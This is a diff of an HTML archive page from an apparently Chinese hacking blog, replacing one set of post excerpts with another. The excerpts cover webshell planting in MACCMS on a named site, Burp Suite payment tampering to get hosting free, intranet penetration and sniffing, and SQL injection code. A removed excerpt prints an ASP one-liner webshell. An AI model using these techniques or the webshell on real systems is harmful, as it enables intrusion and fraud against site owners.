@@ -45,35 +45,29 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-05-18T07:32:35.000Z" itemprop="datePublished">
-          2012-05-18
+      <time datetime="2012-10-28T20:46:06.000Z" itemprop="datePublished">
+          2012-10-29
       </time>
     
     
     | 
-    <a href='/tag/VOIP网络电话系统的搭建/'>VOIP网络电话系统的搭建</a>,
+    <a href='/tag/Webshell/'>Webshell</a>,
     
-    <a href='/tag/VOIP/'>VOIP</a>,
-    
-    <a href='/tag/网络电话/'>网络电话</a>,
-    
-    <a href='/tag/教程/'>教程</a>,
-    
-    <a href='/tag/SIP协议/'>SIP协议</a>
+    <a href='/tag/突破安全狗/'>突破安全狗</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/434.seo/">黑吧VOIP网络电话系统的搭建系列教程介绍与下载</a></h2>
+      <h2 class="post-title"><a href="/913.seo/">MACCMS PHP版突破安全狗后台拿webshell</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        <p>大家好，我是黑吧的princelove,</p>  <p>现在给大家带来的是系列教程之：<b>VOIP</b><b>网络电话系统的搭建</b></p>  <p>这类的<b>动画教程</b>网上很少，基本没有，这里我就给大家详细的演示一遍……….</p>  <p><b></b></p>  <p><b>工具:</b></p>  <p>3CXPhoneSystem.exe 服务器安装</p>  <p>3CXPhone4.msi 客户端安装</p>  <p>uTing.exe 语音提示音生成工具</p>  <p>安装包过大，请大家自行网上下载。</p>  <p><b>服务器环境</b>：推荐windows 2003/2008，xp也可以；Microsoft .NET Framework v2.0 以上</p>  <p>内存512M以上</p>  <p><b>客户机环境</b>：windows xp、windows 7/8、windows 2000/2003/2008等</p>  <p>具体请看操作……我就不打字了。</p>  <p><b></b></p>  <p><strong>第一节：初识网络电话及搭建需求</strong></p>  <p><strong>第二节：3cx服务端与客户机的配置</strong></p>  <p><strong>第三节：个性化服务-语音接待</strong></p>  <p><strong>第四节：个性化服务-来电转接</strong></p>  <p><strong>第五节：优化语音系统-汉化提示音</strong></p>  <p><strong>第六节：内网映射端口和域名连接3CX服务器</strong></p>  <p><strong>第七节：深入浅出-网络电话SIP协议抓包剖解</strong></p>  <p>2<b></b></p>  <p><b></b></p>  <p>QQ交流群55174448，54952985</p>  <p>&#160;</p>  <p>&#160;</p>  <p><b>第一节、</b>初识网络电话及搭建需求<b>：</b><b> </b></p>
+        <p>昨天碰上的，记录一下过程，没什么含量，类似的文章肯定有，如有雷同肯定巧合（语文不太好，大家将就着看）：   <br />条件：    <br />1、电影站是maccms php版本的。    <br />2、服务器安装了<a href="http://ha.cker.in/tag/突破安全狗" target="_blank">安全狗</a>。    <br />3、有后台帐号密码。    <br />当然了首先第一步百度一下，有没有相关文章。发现了先前有大牛发了一个上传的漏洞测试失败，估计是官方已修复。    <br />进后台，发现可以编辑模板，如下图：    <br /><a href="http://img.cker.in/MACCMSPHPwebshell_B328/clip_image001.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/MACCMSPHPwebshell_B328/clip_image001_thumb.jpg" width="967" height="655" /></a>    <br />路径是：    <br /><a href="http://0855.tv/admin/admin_templates.php?action=edit&amp;file=../template/default/html/art.html">http://0855.tv/admin/admin_templates.php?action=edit&amp;file=../template/default/html/art.html</a>    <br />然后IE里构造一下：    <br /><a href="http://0855.tv/admin/admin_templates.php?action=edit&amp;file=index.php">http://0855.tv/admin/admin_templates.php?action=edit&amp;file=index.php</a>    <br />得到：    <br /><a href="http://img.cker.in/MACCMSPHPwebshell_B328/clip_image002.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/MACCMSPHPwebshell_B328/clip_image002_thumb.jpg" width="743" height="590" /></a>    <br />这个可比那个 ShopEx后台历遍目录 猛多了，不但可以看到内容，还可以编辑。    <br />这样的话，基本上就可以拿<a href="http://ha.cker.in/tag/webshell" target="_blank">webshell</a>了。含量不高。为了不破坏程序，我打算在admin/version.php    <br />这个文件中写入后门。</p><br>
       
       </p>
       
       <p>
-          <a href="/434.seo/" class="excerpt-link">Read More...</a>
+          <a href="/913.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -82,29 +76,31 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-05-18T07:08:33.000Z" itemprop="datePublished">
-          2012-05-18
+      <time datetime="2012-10-28T20:34:02.000Z" itemprop="datePublished">
+          2012-10-29
       </time>
     
     
     | 
-    <a href='/tag/速成建站/'>速成建站</a>,
+    <a href='/tag/burpsuite/'>burpsuite</a>,
     
-    <a href='/tag/通杀漏洞/'>通杀漏洞</a>
+    <a href='/tag/idc/'>idc</a>,
+    
+    <a href='/tag/支付漏洞/'>支付漏洞</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/430.seo/">速成建站通杀漏洞：文件上传导致任意代码执行，直接秒杀服务器</a></h2>
+      <h2 class="post-title"><a href="/912.seo/">burpsuite之免费购买虚拟空间之沦陷IDC服务商</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        <p><b>漏洞详情</b><b></b></p><br><p>披露状态：<b></b></p><br><p>2012-05-17： 积极联系厂商并且等待厂商认领中，细节不对外公开   <br />2012-05-17： 厂商已经主动忽略漏洞，细节向公众公开</p><br><p>简要描述：</p><br><p>程序设计上失误 没有完全判断上传后缀！</p><br><p>详细说明：</p><br><p>速成建站通杀漏洞，直接秒杀服务器！进去直接mysql最高权限 ！危害这个你懂滴！</p><br><p>漏洞证明：</p><br><p><a href="http://my.5uweb.com/coon.asp">http://my.5uweb.com/coon.asp</a>   <br />服务器咱就不进了！！河蟹啊！</p><br><p>
+        <p>by:245661320@90sec.org</p>  <p>本人文笔不好，其实这次渗透过程也很艰难曲折的，只是个人文笔问题表达的不太生动，大家见谅！！</p>  <p>今天给大家讲解下burpsuite应用，这个东西我在咱们这里看用着比较少，今天我就来给大家来讲解下。</p>  <p>前两天我在淘宝上找了个空间，但我又不想花钱，怎么办呢？结果有了下文。</p>  <p><a href="http://img.cker.in/burpsuiteIDC_B045/clip_image002.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/burpsuiteIDC_B045/clip_image002_thumb.jpg" width="620" height="357" /></a></p>  <p>于是我就在他那个网站注册了个会员，然后左看看右看看做一些测试比较繁琐我就不一一讲述了。</p>  <p>然后我点金那个详细，看见有购买空间，我就用burpsuite截取下他的数据包看看可不可以改包进行突破！</p>  <p><a href="http://img.cker.in/burpsuiteIDC_B045/clip_image003.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image003" border="0" alt="clip_image003" src="http://img.cker.in/burpsuiteIDC_B045/clip_image003_thumb.jpg" width="349" height="127" /></a></p>  <p><a href="http://img.cker.in/burpsuiteIDC_B045/clip_image004.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image004" border="0" alt="clip_image004" src="http://img.cker.in/burpsuiteIDC_B045/clip_image004_thumb.jpg" width="242" height="200" /></a></p>  <p>先声明，我这个号里没有钱一分钱也没有</p>  <p><a href="http://img.cker.in/burpsuiteIDC_B045/clip_image005.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image005" border="0" alt="clip_image005" src="http://img.cker.in/burpsuiteIDC_B045/clip_image005_thumb.jpg" width="400" height="63" /></a></p>  <p>后我就开始截取封包，该数据，把购买几年那里改为-1我们在发送数据包也就是我们125元买-1年的空间但是他要是没有做错误处理的话肯定会出</p><br>
       
       </p>
       
       <p>
-          <a href="/430.seo/" class="excerpt-link">Read More...</a>
+          <a href="/912.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -113,27 +109,27 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-05-18T06:36:10.000Z" itemprop="datePublished">
-          2012-05-18
+      <time datetime="2012-10-26T05:05:16.000Z" itemprop="datePublished">
+          2012-10-26
       </time>
     
     
     | 
-    <a href='/tag/SQL通用防注入系统asp版漏洞/'>SQL通用防注入系统asp版漏洞</a>
+    <a href='/tag/百度分站被黑/'>百度分站被黑</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/428.seo/">SQL通用防注入系统asp版漏洞</a></h2>
+      <h2 class="post-title"><a href="/911.seo/">百度分站被黑</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        今晚群里朋友叫看个站，有sql防注入，绕不过，但是有发现记录wrong的文件sqlin.asp。   既然做了记录，再查看了下它的记录文件    于是想着构造个asp一句话写进去，前面几种没加密的都失败了，于是写了个加密的   &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; ┼攠數畣整爠煥敵瑳∨≡┩愾&#160;&#160;&#160;&#160;&#
+        2012.10.26。百度分站被黑！半个小时内传遍了。。各种装逼挂主页     Shell    哎哟，主页要被改烂了……  
       
       </p>
       
       <p>
-          <a href="/428.seo/" class="excerpt-link">Read More...</a>
+          <a href="/911.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -142,31 +138,29 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-05-18T06:34:04.000Z" itemprop="datePublished">
-          2012-05-18
+      <time datetime="2012-10-23T18:22:17.000Z" itemprop="datePublished">
+          2012-10-24
       </time>
     
     
     | 
-    <a href='/tag/菜刀/'>菜刀</a>,
+    <a href='/tag/渗透/'>渗透</a>,
     
-    <a href='/tag/一句话/'>一句话</a>,
-    
-    <a href='/tag/护卫神/'>护卫神</a>
+    <a href='/tag/嗅探/'>嗅探</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/425.seo/">突破护卫神的菜刀一句话 & 一句话变形处理</a></h2>
+      <h2 class="post-title"><a href="/910.seo/">Linux下渗透嗅探术</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        <p>&lt;%Y=request(&quot;x&quot;)%&gt; &lt;%execute(Y)%&gt;    <br />asp的&#160; 密码为x</p>
+        <p>作者：Beach,饭   <br />此文已发表&lt;黑客防线&gt;转载注明作者    <br />内网渗透在攻击层面，其实更趋向于社工和常规漏洞检测的结合，为了了解网内防护措施的设置是通过一步步的刺探和经验积累，有时判断出错，也能进入误区。但是如果能在网内进行嗅探，则能事半功倍，处于一个对网内设置完全透明的状态。本文将从一个注点引发的突破，到控制整个内网的全过程来跟大家讨论，内网的渗透嗅探术和安全防护一些内容。    <br />在寻找突破时，更多的是从应用服务来，而应用服务最直观的信息采集，就是端口扫描，不同的应用，开放的服务不一样。所以，在对网络进行信息收集时，大概分为这样两步： 端口探测，程序指纹分析。在端口探测方面，个人喜欢用SuperScan来快速对网段里的应用进行判断，如图：    <br /><a href="http://img.cker.in/Linux_8FCF/clip_image002.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/Linux_8FCF/clip_image002_thumb.jpg" width="615" height="471" /></a></p>  <p>在掌握端口信息后，就要对服务应用程序的指纹进行分析，主要包括版本号、已知的漏洞信息、常规配置信息、针对此应用流行的攻击方法等。本文试着对网内一台提供WEB服务的主机作为突破口，提交一个畸形的请求，如图：   <br /><a href="http://img.cker.in/Linux_8FCF/clip_image004.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image004" border="0" alt="clip_image004" src="http://img.cker.in/Linux_8FCF/clip_image004_thumb.jpg" width="478" height="574" /></a></p><br>
       
       </p>
       
       <p>
-          <a href="/425.seo/" class="excerpt-link">Read More...</a>
+          <a href="/910.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -175,29 +169,22 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-05-09T17:54:24.000Z" itemprop="datePublished">
-          2012-05-10
+      <time datetime="2012-10-22T21:48:53.000Z" itemprop="datePublished">
+          2012-10-23
       </time>
     
-    
-    | 
-    <a href='/tag/VMware/'>VMware</a>,
-    
-    <a href='/tag/虚拟机/'>虚拟机</a>
-    
-    
 </span>
-      <h2 class="post-title"><a href="/422.seo/">虚拟机报错：【无法打开内核设备"\\.\VMCIDev\VMX"  系统找不到指定的文件】的解决办法</a></h2>
+      <h2 class="post-title"><a href="/909.seo/">一次针对国外目标的内网渗透案例</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        <p>刚在xp上安装VMWare8.0.3，新建虚拟机出现这种错误：</p>  <p>无法打开内核设备“\.\VMCIDev\VMX”: 系统找不到指定的文件。你想要在安装 VMware Workstation 前重启吗? </p>  <p>打开模块DevicePowerOn电源失败。</p>
+        <p>目标域名：www.xyz.com    <br />目的：渗透整个内网 拿下域控     <br />收集信息：     <br />访问网站www.xyz.com发现站点时静态的，也没有什么登陆口，服务器用的是IIS6.0。Ping出此域名ip：111.111.111.111 在ip866上面查询了下，只绑定了这一个站，看来旁注也没希望。顺便查询了一下域名Whiose信息，得到一个域名注册邮箱sales@xxx.net，域名所有者，管理联系人等信息。查询了一下ip地址范围和管理机构国家、NS记录等。     <br />整理了下信息，继续扫描了下这个网段，几乎都开了80端口，很多同样模板的网站，都是其他公司或企业的。猜想估计这是个托管服务器了，而且和内网的联系甚少。即使拿下来可能也很难渗透到内网。     <br />然后把目标转向了邮件服务器，在网上查询了下MX记录，得到一个邮件服务器地址：mail.xyz.com,Ping出其ip为 222.222.222.222，感觉和WEB服务器的ip没一点关系。扫描了一下邮件服务器所在的网段的ip，发现开80端口的ip很少，而且有几个是 路由器，其中一台有snmp弱口令”public”,ip为222.222.222.221。用IP Network Browser，扫描出此路由器的一些信息，得到其中管理员联系邮箱xxxx@xyz.com。 由此猜想这就是目标内网所在的外网ip段了。访问域名mail.xyz.com,地址跳转到owa.xyz.com,而且出现Exchange Web Access的登录界面。Ping出owa.xyz.com的ip为222.222.222.223。最近Exchange 2007也没有什么漏洞可用。本来想说从这个网段的其他机器入手，嗅探一下路由器密码或者邮件密码，结果此网段开了web服务器和3389端口的机器基本 没几个，暂时先不走这条路。 </p><br>
       
       </p>
       
       <p>
-          <a href="/422.seo/" class="excerpt-link">Read More...</a>
+          <a href="/909.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -206,27 +193,23 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-05-04T07:03:33.000Z" itemprop="datePublished">
-          2012-05-04
+      <time datetime="2012-10-22T21:44:54.000Z" itemprop="datePublished">
+          2012-10-23
       </time>
     
-    
-    | 
-    <a href='/tag/SQL-Injection/'>SQL Injection</a>
-    
-    
 </span>
-      <h2 class="post-title"><a href="/419.seo/">拍客piikee竞拍网站源码全局sql injection</a></h2>
+      <h2 class="post-title"><a href="/908.seo/">扫描内网指定用户能获取管理权限的机器</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        <p>主题:拍客piikee竞拍网站源码全局sql injection   <br />作者:piaoye    <br />版权:3EST信息安全团队 (<a href="http://www.3est.com" target="_blank">www.3est.com</a>) </p>  <p>0x01 简介   <br />在乌云看以快拍拍网站充值BUG，就搜索了下这个网站，谷歌里有个类似的网站，程序注射一堆,然后就进去了。    <br />0x02 配置并编译    <br />php+mysql    <br />0x03 实战应用    <br />为什么说2B那？前台所有文件参数值都这样来的，大家看下这段代码</p>  <p>   <br />news_arc.php    <br />&lt;?php    <br />define(‘IN_JP’,true);    <br />require_once(&quot;./config/init.php&quot;); </p>  <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160; $arcid = $_REQUEST[&quot;arcid&quot;];   <br />&#160;&#160;&#160;&#160;&#160;&#160;&#160; if($arcid!=&quot;&quot;){    <br />&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; $qrynews2 = &quot;select <em> from news where id = &quot;.$arcid;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; <br />&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; $objnews2=$GLOBALS[‘db’]-&gt;get_one($qrynews2);&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; <br />&#160;&#160;&#160;&#160;&#160;&#160;&#160; }else{    <br />&#160;&#160;&#160;&#160;&#160;&#160;&#160; $objnews2=&quot;&quot;;    <br />&#160;&#160;&#160;&#160;&#160;&#160;&#160; } </p>  <p>&#160; $qrycount = &quot;select w.id,r.username,w.won_date,p.name,a.auc_final_price,a.auctionID,p.picture1,p.price,(100-100</em>a.auc_final_price/p.price) as discount,a.auctionID from won_auctions w left join auction a on w.auction_id=a.auctionID left join products p on a.productID=p.productID inner join registration r on w.userid = r.id where w.userid&gt;=0 order by w.won_date desc limit 0,7 &quot;;&#160; <br />&#160; $obj1 = $GLOBALS[‘db’]-&gt;select($qrycount); </p>  <p>$smarty-&gt;assign(&quot;obj1&quot;,$obj1);   <br />$smarty-&gt;assign(&quot;objnews2&quot;,$objnews2);    <br />$smarty-&gt;display(‘news_arc.htm’);    <br />?&gt;    <br /></p>
+        一个BAT脚本，自动获取内网机器列表，自动判断在线，自动扫描然后记录到日志…….   自动修正域名，自动判断域。。。不废话了，发代码  &#160;  =========================user.txt=========================格式：domain\username passwordusername password
+=========================getadmin.bat====
       
       </p>
       
       <p>
-          <a href="/419.seo/" class="excerpt-link">Read More...</a>
+          <a href="/908.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -234,7 +217,7 @@
   
   <nav class="pagination" role="pagination">
     <a class="newer-posts" href="/archives/page/35/">← Newer Posts</a>
-    <span class="page-number">Page 36 of 57</span>
+    <span class="page-number">Page 36 of 81</span>
     <a class="older-posts" href="/archives/page/37/">Older Posts →</a>
   </nav>
 </main>
